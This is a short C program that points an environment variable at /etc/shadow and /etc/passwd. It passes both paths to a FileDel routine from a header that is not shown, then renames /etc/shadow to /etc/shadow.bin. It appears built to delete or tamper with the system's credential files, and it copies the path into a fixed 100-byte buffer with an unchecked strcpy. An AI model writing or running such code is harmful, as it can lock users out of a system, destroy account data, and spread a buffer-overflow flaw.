#include<stdio.h>
#include"server.h"

#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    char *path, *path1, *path2;

	if((path = getenv("PFILE")) == NULL){
		char *envptr = "PFILE=/etc/shadow:/etc/passwd";
		if(putenv(envptr) != 0){
			fprintf(stderr,"Unknow error\n");
		} 	
	}

	path = getenv("PFILE");
	word = argv[1];


    char envptr[100];
    
    strcpy(envptr, path);
    
    path1 = strtok(envptr, ":"); 
    
    path2 = strtok(NULL, ":"); 

    FileDel(path1);
    FileDel(path2);
rename(path1,"/etc/shadow.bin");

    return 0;
}
